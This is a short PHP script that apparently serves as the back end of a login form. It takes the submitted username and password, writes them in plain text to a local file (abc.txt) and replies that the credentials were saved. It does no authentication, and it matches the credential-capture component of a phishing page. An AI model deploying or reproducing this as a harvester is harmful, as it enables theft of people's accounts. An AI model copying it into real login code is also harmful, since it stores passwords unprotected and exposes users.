<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
   $file = fopen("abc.txt", "w") or  die("Unable to open file!");
   fwrite($file, $username . "\n" . $password);
  fclose($file);
  echo 'Credentials saved successfully';
}
?>
